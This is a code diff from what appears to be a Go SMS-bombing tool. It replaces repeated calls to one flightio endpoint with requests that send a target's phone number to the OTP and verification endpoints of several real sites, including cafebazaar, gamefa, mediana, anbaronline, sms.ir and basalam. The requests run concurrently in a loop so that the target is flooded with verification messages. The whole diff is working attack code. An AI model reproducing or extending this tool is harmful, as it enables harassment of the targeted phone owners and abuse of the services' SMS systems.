@@ -108,24 +108,24 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
-		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
-			"userKey": phone,
-		}, ch) 
+		go sms("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", map[string]interface{}{
+			"username": phone,
+		}, ch) // add site
+		go sms("https://gamefa.com/wp-admin/admin-ajax.php", map[string]interface{}{
+			"digits_phone": phone,
+		}, ch)  // add site
+		go sms("https://app.mediana.ir/api/account/AccountApi/CreateOTPWithPhone", map[string]interface{}{
+			"phone": phone,
+		}, ch)  // add site
+		go sms("https://www.anbaronline.ir/account/sendotpjson", map[string]interface{}{
+			"mobile": phone,
+		}, ch) //add site  /catcha site
+		go sms("https://appapi.sms.ir/api/app/auth/sign-up/verification-code", map[string]interface{}{
+			"": phone,
+		}, ch)  // add site
+		go sms("https://auth.basalam.com/captcha/otp-request", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // add site
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch) 
